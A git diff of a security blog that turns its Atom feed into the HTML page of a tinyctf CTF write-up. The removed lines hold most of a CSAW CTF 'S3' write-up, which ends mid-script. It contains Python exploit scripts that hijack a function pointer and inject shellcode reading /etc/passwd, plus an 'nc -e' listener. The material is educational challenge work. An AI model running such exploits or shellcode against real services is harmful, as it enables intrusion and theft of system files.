@@ -1,24 +1,90 @@
-<?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[staring into /dev/null]]></title>
-  <link href="http://barrebas.github.io/atom.xml" rel="self"/>
-  <link href="http://barrebas.github.io/"/>
-  <updated>2014-10-14T21:15:51+02:00</updated>
-  <id>http://barrebas.github.io/</id>
-  <author>
-    <name><![CDATA[barrebas]]></name>
-    
-  </author>
-  <generator uri="http://octopress.org/">Octopress</generator>
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Tinyctf Writeup - staring into /dev/null</title>
+  <meta name="author" content="barrebas">
 
   
-  <entry>
-    <title type="html"><![CDATA[Tinyctf Writeup]]></title>
-    <link href="http://barrebas.github.io/blog/2014/10/03/tinyctf/"/>
-    <updated>2014-10-03T19:25:41+02:00</updated>
-    <id>http://barrebas.github.io/blog/2014/10/03/tinyctf</id>
-    <content type="html"><![CDATA[<p><code>tinyctf</code> was ran by @balidani and was actually a very enjoyable Jeopardy-style CTF event! I spent quite some time on the challenges and got all flags except crypto200. I kept some notes in <code>keepnote</code> which I converted to this blog post. The name of each challenge was a hint for solving the challenge. The author hinted at a VM containing all the challenges, so keep you eyes peeled for that one.</p>
+  <meta name="description" content="tinyctf was ran by @balidani and was actually a very enjoyable Jeopardy-style CTF event! I spent quite some time on the challenges and got all flags &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://barrebas.github.io/blog/2014/10/03/tinyctf">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">staring into /dev/null</a></h1>
+  
+    <h2>booting boot2roots to root</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:barrebas.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Tinyctf Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-10-03T19:25:41+02:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>7:25 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><code>tinyctf</code> was ran by @balidani and was actually a very enjoyable Jeopardy-style CTF event! I spent quite some time on the challenges and got all flags except crypto200. I kept some notes in <code>keepnote</code> which I converted to this blog post. The name of each challenge was a hint for solving the challenge. The author hinted at a VM containing all the challenges, so keep you eyes peeled for that one.</p>
 
 <!--more-->
 
@@ -345,7 +411,7 @@ IEND</code></pre></div>
 
 <p>This created a difference file from both PNGs. This file had a very obvious QR code:</p>
 
-<p><img src="http://barrebas.github.io/assets/stego100-diff.png" alt="" /></p>
+<p><img src="/assets/stego100-diff.png" alt="" /></p>
 
 <p>Scanning this QR code with a smartphone yielded <code>flag{#justdiffit}</code></p>
 
@@ -377,7 +443,7 @@ FBAJGF, FWMMVWCHGH XO NSG WFWAI &quot;TIAD&quot; NAD ACH JWMIO XMAJGF. GCUVO.</c
 
 <p>The image is still a bit mangled, but after flipping the image vertically, the flag is legible:</p>
 
-<p><img src="http://barrebas.github.io/assets/cry300.png" alt="" /></p>
+<p><img src="/assets/cry300.png" alt="" /></p>
 
 <p><code>flag{no_penguin_here}</code></p>
 
@@ -503,407 +569,107 @@ Good bye!</code></pre></div>
 <p><code>flag{valet_knekt_jack_jumbo}</code></p>
 
 <p>And that was it! I hope there&rsquo;s more of this <code>tinyctf</code> to come!</p>
-]]></content>
-  </entry>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
   
-  <entry>
-    <title type="html"><![CDATA[CSAW CTF Expl 300: S3]]></title>
-    <link href="http://barrebas.github.io/blog/2014/09/25/CSAW-s3/"/>
-    <updated>2014-09-25T19:25:41+02:00</updated>
-    <id>http://barrebas.github.io/blog/2014/09/25/CSAW-s3</id>
-    <content type="html"><![CDATA[<p>A while ago, we threw together a semi-official VulnHub CTF team. This team participated in the CSAW CTF. For me, it was a new and <em>humbling</em> experience. I didn&rsquo;t get a lot of flags but I managed to get this one.</p>
 
-<!--more-->
+<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>
 
+      
 
-<p>Upon downloading the binary called <code>s3</code>, I connected to the remote server to quickly see what I was up against.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>nc 54.165.225.121 5333</code></pre></div>
 
 
-<p>However, the connection timed out very quickly. I checked out the local copy with file:</p>
+<time class='entry-date' datetime='2014-10-03T19:25:41+02:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>7:25 pm</span></time>
+      
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>file s3
-s3: ELF 64-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for</span> GNU/Linux 2.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0xe99ee53d6922baffcd3cecd9e6b333f7538d0633, stripped</code></pre></div>
-
-
-<p>Interesting, a 64 bit binary. Viewing it in <code>hopper</code> suggested that it is a C++ binary. I started the binary locally and faced the same quick time-out. This didn&rsquo;t sit well with me, because I could hardly enter the second command to play around.</p>
-
-<p>I fired up <code>gdb-peda</code> and ran the binary. It quickly showed the problem:</p>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>r
-warning: Could not load shared library symbols <span class="k">for</span> linux-vdso.so.1.
-Do you need <span class="s2">&quot;set solib-search-path&quot;</span> or <span class="s2">&quot;set sysroot&quot;</span>?
-Welcome to Amazon S3 <span class="o">(</span>String Storage Service<span class="o">)</span>
-
-    c &lt;<span class="nb">type</span>&gt; &lt;string&gt; - Create the string &lt;string&gt; as &lt;<span class="nb">type</span>&gt;
-                        Types are:
-                            <span class="m">0</span> - NULL-Terminated String
-                            <span class="m">1</span> - Counted String
-    r &lt;id&gt;            - Read the string referenced by &lt;id&gt;
-    u &lt;id&gt; &lt;string&gt;   - Update the string referenced by &lt;id&gt; to &lt;string&gt;
-    d &lt;id&gt;            - Destroy the string referenced by &lt;id&gt;
-    x                 - Exit Amazon S3
-
-&gt; 
-Program received signal SIGALRM, Alarm clock.</code></pre></div>
-
-
-<p><img src="http://barrebas.github.io/assets/s3-gdb-alarm.png" alt="s3: gdb caught the alarm." /></p>
-
-<p>Turns out this SIGALRM is generated by a call to <a href="http://linux.die.net/man/2/alarm">alarm()</a>. In hindsight, I could have made a library that overrides the call to <code>alarm()</code>, but I went with the hex-editing approach. I disassembled the binary using <code>objdump</code> and used <code>grep</code> to search the output for &ldquo;alarm&rdquo;:</p>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>objdump -d s3 <span class="p">|</span> grep alarm
-<span class="m">0000000000401300</span> &lt;alarm@plt&gt;:
-  402126:   e8 d5 f1 ff ff          callq  <span class="m">401300</span> &lt;alarm@plt&gt;
-  403771:   e8 8a db ff ff          callq  <span class="m">401300</span> &lt;alarm@plt&gt;</code></pre></div>
-
-
-<p>Using <code>xxd</code>, <code>objdump</code> and <code>sed</code>, I replaced those bytes with NOPs and reversed the process with <code>xxd -r</code>, generating a new binary in the process that was devoid of annoying timeouts!</p>
-
-<p>The binary allows the storage of two types of strings: NULL-terminated and so-called &ldquo;counted&rdquo; strings. I assume these are like the strings used in Pascal, where the length of the string is prepended to the string. I created a NULL-terminated string and the binary gave me an identifier. I updated the string and was given another, very similar identifier. I read the string, deleted it and tried to read it again. The program happily told me there was no such string identifier and called it a day. I did notice that the string identifiers are in fact hex-addresses and examining these locations in gdb confirmed it.</p>
-
-<p><img src="http://barrebas.github.io/assets/s3-NULL-string.png" alt="s3: NULL-terminated strings, no problems!" /></p>
-
-<p>Next, the obvious target was the &ldquo;counted&rdquo; string. I created a string &ldquo;bleh&rdquo;, updated it to &ldquo;blehbleh&rdquo; and tried to read from it&hellip; segfault! Awesome, we have a lead.</p>
-
-<p><img src="http://barrebas.github.io/assets/s3-countedstring-segfault.png" alt="s3: counted strings... Oops!" /></p>
-
-<p>Time to fire up <code>gdb</code> again and try to reproduce the crash:</p>
-
-<p><img src="http://barrebas.github.io/assets/s3-reproduced-crash.png" alt="s3: success! Let's see what's going on." /></p>
-
-<p>It looks like the updated string somehow overwrites a function pointer. This pointer is used here:</p>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">=</span>&gt; 0x4019d6: call   QWORD PTR <span class="o">[</span>rax+0x10<span class="o">]</span></code></pre></div>
-
-
-<p>Obviously, <code>0x42424242-0x10</code> holds nothing interesting. However, we have overwritten a function pointer with a value that we control so in principle, we can hijack <code>EIP</code> and execute arbitrary code! The drawback is that the pointer is derefenced, so in order to execute any shellcode, we need to do the following:</p>
-
-<p><img src="http://barrebas.github.io/assets/strings.png" alt="s3: exploitation flow" /></p>
-
-<p>We store shellcode somewhere, we store a pointer to the shellcode and finally, we overwrite the function pointer with a pointer to the pointer to the shellcode&hellip; confusing, eh? I went bit by bit, using the string storing service to store stuff. The string identifiers turned out to be memory addresses:</p>
-
-<p><img src="http://barrebas.github.io/assets/s3-gdb-id-is-address.png" alt="s3: memory addresses as string identifiers" /></p>
-
-<p>I got tired of copying and pasting the string identifiers so I switched over to python. In order to emulate the server, I put the binary behind a nc listener:</p>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="k">while</span> <span class="o">[[</span> <span class="m">1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do</span> nc -e ./s3 -v -l -p 5333<span class="p">;</span> <span class="k">done</span></code></pre></div>
-
-
-<p>Notice that I&rsquo;m using <code>s3</code> again, as this will automagically restart without the need for a clean shutdown (in case the script needs debugging). I enabled coredumps with <code>ulimit -c unlimited</code> and started scripting and debugging, a lot.</p>
-
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
-
-<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span>
-
-
-<span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
-    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)$&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span><span class="o">&lt;</span>  
-    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
-    
-<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">5333</span><span class="p">))</span>
-
-<span class="c"># banner</span>
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
-
-<span class="c"># send first string. this will be our shellcode</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 CTF!</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
-<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="k">print</span> <span class="s">&#39;[+] first location = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span>
-
-<span class="c"># send second string. this will be our &#39;pivot&#39; pointer. </span>
-<span class="c"># let&#39;s crash the binary to see if this works</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;c 1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
-
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
-<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;u &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; AAAA</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="k">print</span> <span class="s">&#39;[+] second location = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span>
-
-<span class="c"># send read request to crash binary</span>
-
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;r &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
-
-<span class="c"># terminate connection cleanly</span>
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;x</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-
-<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
-
-
-<p>After running this (and careful debugging of the script) I got a coredump:</p>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python ./amaz.py 
-Welcome to Amazon S3 <span class="o">(</span>String Storage Service<span class="o">)</span>
-
-    c &lt;<span class="nb">type</span>&gt; &lt;string&gt; - Create the string &lt;string&gt; as &lt;<span class="nb">type</span>&gt;
-                        Types are:
-                            <span class="m">0</span> - NULL-Terminated String
-                            <span class="m">1</span> - Counted String
-    r &lt;id&gt;            - Read the string referenced by &lt;id&gt;
-    u &lt;id&gt; &lt;string&gt;   - Update the string referenced by &lt;id&gt; to &lt;string&gt;
-    d &lt;id&gt;            - Destroy the string referenced by &lt;id&gt;
-    x                 - Exit Amazon S3
-
-
-<span class="o">[</span>+<span class="o">]</span> first <span class="nv">location</span> <span class="o">=</span> 0x00b10030
-<span class="o">[</span>+<span class="o">]</span> second <span class="nv">location</span> <span class="o">=</span> 0x00b10050
-bas@tritonal:~/documents/s3 writeup<span class="nv">$ </span>gdb ./s3 core
-...snip...
-gdb-peda<span class="nv">$ </span>i r
-rax            0x41414141   0x41414141</code></pre></div>
-
-
-<p>Good, we have control over <code>rax</code>. Now let&rsquo;s use this to dereference the pointer to the first string:</p>
-
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;u &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&gt;L&#39;</span><span class="p">,</span> <span class="n">p_shellcode</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span></code></pre></div>
-
-
-<p>Which obviously still crashes, because now the binary executes:</p>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#0  0x0000000021465443 in ?? ()</span></code></pre></div>
-
-
-<p>Which obviously contains no data, nor any code. But let&rsquo;s give it a proper pointer, shall we? And while I&rsquo;m at it, I&rsquo;ll set the shellcode to <code>INT3</code>. The stack is executable, so this should work!</p>
-
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
-
-<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span>
-
-
-<span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
-    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)$&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
-    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
-    
-<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">5333</span><span class="p">))</span>
-
-<span class="c"># banner</span>
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
-
-<span class="c"># send first string. this will be our shellcode</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 </span><span class="se">\xCC\xCC\xCC\xCC\n</span><span class="s">&#39;</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
-<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="k">print</span> <span class="s">&#39;[+] shellcode = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span>
-
-
-<span class="c"># send second string. this will be our &#39;pivot&#39; pointer. </span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
-<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="k">print</span> <span class="s">&#39;[+] pivot = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span>
-
-<span class="c"># let&#39;s crash the binary to see if this works</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;c 1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
-
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
-<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;u &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">p_pivot</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
-<span class="n">p_vuln</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="k">print</span> <span class="s">&#39;[+] vulnerable pointer = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span>
-
-<span class="c"># send read request to crash binary</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;r &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
-
-<span class="c"># terminate connection cleanly</span>
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;x</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-
-<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
-
-
-<p>In the other terminal, I observed:</p>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from localhost <span class="o">[</span>127.0.0.1<span class="o">]</span> 53500
-Trace/breakpoint <span class="nb">trap</span> <span class="o">(</span>core dumped<span class="o">)</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">5333</span> ...</code></pre></div>
-
-
-<p>BOOM! Code execution on my local machine!</p>
-
-<p>At this point I wasted some time to cook up a small shellcode that would re-use existing code in the binary, to verify that the stack was indeed executable in the remote binary. It was, whoop-dee-doo! Next I searched for a proper shellcode and stumbled upon <a href="!http://shell-storm.org/shellcode/files/shellcode-878.php">this one</a>.</p>
-
-<p>I stuck it in the exploit and lo and behold:</p>
-
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
-
-<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span>
-
-
-<span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
-    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)$&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
-    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
-    
-<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">5333</span><span class="p">))</span>
-
-<span class="c"># banner</span>
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
-
-<span class="c"># send first string. this will be our shellcode</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;c 0 </span><span class="se">\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41\n</span><span class="s">&#39;</span><span class="p">)</span>
-
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>    <span class="c"># receive pesky &#39;&gt; &#39;</span>
-<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-
-<span class="k">print</span> <span class="s">&#39;[+] shellcode = 0x{0:08x}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span>
-
-
-<span class="c"># send second string. this will be our &#39;pivot&#39; pointer. </span>
